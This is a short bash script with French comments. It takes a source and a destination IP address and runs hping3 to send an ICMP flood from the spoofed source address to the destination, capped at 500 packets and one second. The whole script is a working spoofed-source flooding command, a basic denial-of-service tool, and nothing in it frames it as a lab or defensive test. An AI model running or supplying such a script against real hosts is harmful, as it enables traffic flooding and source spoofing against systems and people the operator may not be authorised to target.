#!/bin/bash

# Vérifier le nombre d'arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <source_ip> <destination_ip>"
    exit 1
fi

# Récupérer les adresses IP à partir des arguments
source_ip="$1"
destination_ip="$2"

# Limiter le nombre de paquets à 500 et arrêter après une seconde
packet_count=500
timeout 1 hping3 -1 --flood -c "$packet_count" -a "$source_ip" "$destination_ip"
